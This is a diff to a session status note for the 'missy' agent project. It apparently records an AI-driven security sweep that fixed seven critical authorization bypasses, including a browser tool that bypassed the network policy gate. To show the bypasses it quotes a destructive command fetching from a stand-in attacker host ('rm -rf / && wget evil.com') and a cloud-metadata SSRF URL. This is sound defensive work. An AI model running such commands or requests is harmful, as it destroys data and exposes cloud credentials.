@@ -5,7 +5,7 @@ Date: 2026-07-10
 Branch: `overhaul/missy-validation-20260710-031406`
 Draft PR: https://github.com/MissyLabs/missy/pull/31
 
-## Changed (12 checkpoints this session, full suite green after every one)
+## Changed (13 checkpoints this session, full suite green after every one)
 
 1. Preserved/hardened the existing `voice_commands.py` fix; fixed a real
    trailing-comma leak bug the new regression tests caught.
@@ -52,8 +52,8 @@ Draft PR: https://github.com/MissyLabs/missy/pull/31
     `rm -rf / && wget evil.com` passed policy under that exact default
     config. Fixed the implementation to match its own documented
     contract; no doc changes needed.
-12. **SR-1.6 groundwork / SR-1.5 (sixth critical finding)**: fixed the
-    review's "architectural finding" pattern for Incus tools —
+12. **SR-1.5 (sixth critical finding)**: fixed the review's
+    "architectural finding" pattern for Incus tools —
     `ToolRegistry._check_permissions()` derived the checked shell
     command from a generic `command` kwarg that 14 of 15 Incus tools
     don't have (checking the meaningless literal `"shell"` instead of
@@ -70,14 +70,34 @@ Draft PR: https://github.com/MissyLabs/missy/pull/31
     operation instead of relying on a kwarg-name heuristic that several
     tools' actual kwargs don't match. Verified zero behavior change for
     tools that don't opt into the new hooks.
+13. **SR-1.6 (seventh critical finding, crown-jewel bypass)**:
+    `BrowserNavigateTool` called Playwright's `page.goto(url)` directly
+    with zero routing through `PolicyHTTPClient` or the network policy
+    engine — the sole exception among network-permission tools
+    (`web_fetch`/Discord upload both route through `PolicyHTTPClient`).
+    The registry also had no dynamic host-checking mechanism for network
+    permissions at all (only a static, always-empty `allowed_hosts`
+    list). Live-reproduced: with nothing allowlisted,
+    `browser_navigate(url="http://169.254.169.254/latest/meta-data/")`
+    — the cloud-metadata SSRF target the review names explicitly —
+    passed the registry's permission check with zero denial. Fixed with
+    two layers: (1) a `resolve_network_hosts()` `BaseTool` hook
+    (reusing SR-1.5's hook pattern) that lets `BrowserNavigateTool`
+    declare its real target host, checked by the registry before
+    Playwright is ever touched; (2) a Playwright
+    `context.route("**/*", ...)` interceptor registered on every
+    browser session that gates *every* request — navigation, redirects,
+    subresources, and JS-triggered `fetch()`/XHR via `browser_evaluate`
+    — against the same policy engine, closing the part of the finding
+    ("every subresource/redirect/fetch inside Firefox is outside the
+    Python gateway too") a top-level-only check would have missed.
 
-**Six independent, confirmed critical authorization-bypass
-vulnerabilities** found and fixed this session (SR-1.2/1.3, SR-1.12,
-SR-1.13 ×2, SR-1.8, SR-1.5), all variations on the same underlying
-pattern: an unauthenticated or unrestricted action reachable due to a
-fail-open default, a missing gate, or (SR-1.5's variant) declared tool
-metadata that doesn't match the operation actually performed. Plus the
-FX-A/B/C/D/F/G validation-harness root causes.
+**Seven independent, confirmed critical vulnerabilities** found and
+fixed this session (SR-1.2/1.3, SR-1.12, SR-1.13 ×2, SR-1.8, SR-1.5,
+SR-1.6). Five are the "missing gate before a side effect" pattern; two
+(SR-1.5, SR-1.6) are the review's other named pattern: declared tool
+metadata/permissions that don't match the operation actually performed.
+Plus the FX-A/B/C/D/F/G validation-harness root causes.
 
 **All of FX-A through FX-G are now done** per the prompt's stated
 dependency order (some with residual/deferred sub-items tracked as
@@ -90,7 +110,7 @@ python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
   --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
   --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
   --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
-20770 passed, 13 skipped, 3 deselected in 448.20s (0:07:28)
+20788 passed, 13 skipped, 3 deselected in 446.47s (0:07:26)
 ```
 
 Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
@@ -100,13 +120,14 @@ session, oldest at the bottom, nothing overwritten.
 ## Open tasks (session-tracked, carry into next session)
 
 - **#9** SR-1.x through SR-4.x security review remediation — most of
-  it. This session covered SR-1.2/1.3, SR-1.5, SR-1.8, SR-1.12, SR-1.13
-  (plus SR-3.1 substantially via FX-B). SR-1.1, SR-1.4, SR-1.6 through
-  SR-1.11, SR-2.x, SR-3.2 through SR-3.5, SR-4.x remain. Note: SR-1.5's
-  fix added a general per-tool permission-resolution mechanism
-  (`BaseTool.resolve_shell_command`/`resolve_filesystem_targets`) that
-  SR-1.4 (the same heuristic gap in other tools, e.g. `vision_capture`)
-  can reuse directly rather than needing its own design.
+  it. This session covered SR-1.2/1.3, SR-1.5, SR-1.6, SR-1.8, SR-1.12,
+  SR-1.13 (plus SR-3.1 substantially via FX-B). SR-1.1, SR-1.4, SR-1.7,
+  SR-1.9 through SR-1.11, SR-2.x, SR-3.2 through SR-3.5, SR-4.x remain.
+  Note: SR-1.5's fix added a general per-tool permission-resolution
+  mechanism (`BaseTool.resolve_shell_command`/`resolve_filesystem_targets`/
+  `resolve_network_hosts`) that SR-1.4 (the same heuristic gap in other
+  tools, e.g. `vision_capture`) can reuse directly rather than needing
+  its own design.
 - **#10** Full 89-case tool-specific validation backlog — not yet
   re-run against current code.
 - **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
@@ -126,13 +147,14 @@ session, oldest at the bottom, nothing overwritten.
   works but needs the test-suite migration from mocking
   `subprocess.run` to `subprocess.Popen` done carefully in its own
   session.
-- **New this checkpoint:** SR-1.4 (same declaration/dispatch mismatch
-  pattern in `vision_capture`'s `source`/`save_path` kwargs and any
-  other first-party tool using nonstandard kwarg names) and SR-1.6
-  (Playwright browser navigation bypasses `PolicyHTTPClient`/the
-  network gateway entirely — a different, non-shell mechanism) remain
-  open and are the natural next candidates given the pattern established
-  by SR-1.5.
+- **New this checkpoint:** SR-1.7 (shell allow-list is program-name-only
+  — launcher/redirection side channels; separate from and not addressed
+  by SR-1.5's fix, which only made the *checked* command accurate, not
+  the allow-list's granularity) and SR-1.9 (network policy TOCTOU/
+  deterministic-allowlist-skips-IP-check) are the strongest remaining
+  SR-1.x candidates. SR-1.4 (vision_capture and other tools' unresolved
+  kwarg-name heuristic gaps) can now reuse the `resolve_*` hook
+  mechanism directly with comparatively little new design work.
 
 ## The single biggest remaining gap
 
@@ -151,11 +173,11 @@ rather than code-level reasoning about what *should* happen.
 
 If a way to safely exercise a real or scripted acpx delegate call
 becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
-everything else. Otherwise, continue the SR-1.x security sweep — SR-1.6
-(Playwright bypassing the network gateway) is the strongest remaining
-candidate: it's a crown-jewel bypass ("no outbound unless whitelisted"
-being the product's core claim) and, unlike SR-1.5, requires a genuinely
-different mechanism (the tool calls Playwright directly instead of
-`PolicyHTTPClient`), so it can't reuse the resolve_* hooks alone — or
-pick up one of the concrete scoped tasks above (#11, #12, #15, #16,
-#17) — all are self-contained and don't require a live delegate.
+everything else. Otherwise, continue the SR-1.x security sweep — SR-1.9
+(network policy TOCTOU / deterministic-hosts-skip-IP-check) is the
+strongest next candidate given the network-policy work already fresh
+from SR-1.6, or SR-1.7 (shell allow-list granularity — launchers,
+redirection side channels) given the shell-policy work fresh from
+SR-1.5/SR-1.8 — or pick up one of the concrete scoped tasks above (#11,
+#12, #15, #16, #17), all self-contained and not requiring a live
+delegate.
